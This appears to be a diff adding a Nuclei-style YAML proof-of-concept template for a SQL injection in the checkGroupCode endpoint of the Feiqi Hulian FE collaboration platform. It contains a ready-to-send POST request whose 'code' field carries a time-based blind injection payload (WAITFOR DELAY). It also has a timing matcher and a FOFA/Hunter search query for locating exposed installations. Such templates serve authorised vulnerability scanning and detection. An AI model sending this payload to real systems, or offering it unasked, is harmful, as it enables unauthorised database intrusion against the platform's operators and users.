@@ -1,0 +1,35 @@
+id: poc-db408cbd3a8f9e45b7f7
+info:
+  name: 飞企互联FE业务协作平台checkGroupCode存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/db408cbd3a8f9e45b7f76ace44b7b138
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: db408cbd3a8f9e45b7f76ace44b7b138
+    fofa: + hunter`app.name=="飞企互联 FE 6.0+"`||`app.name=="飞企互联 FE"`
+http:
+- raw:
+  - 'POST /docexchangeManage/checkGroupCode.js%70 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0
+
+    Accept-Encoding: gzip, deflate
+
+    Cookie: JSESSIONID=4B15C07393E691675DB622D9977C79FC
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    code=whoami11'';WAITFOR DELAY ''0:0:5''--'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
